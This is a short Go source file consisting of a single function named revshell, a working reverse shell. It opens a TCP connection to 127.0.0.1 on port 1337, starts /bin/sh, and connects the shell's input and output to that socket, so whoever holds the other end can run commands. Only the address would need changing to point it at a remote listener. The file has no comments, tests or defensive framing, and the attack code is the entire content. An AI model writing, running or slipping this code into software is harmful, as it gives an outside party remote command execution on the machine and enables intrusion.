package main

import (
	"net"
	"os/exec"
)

func revshell() {
	c, _ := net.Dial("tcp", "127.0.0.1:1337")
	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
	c.Close()
}
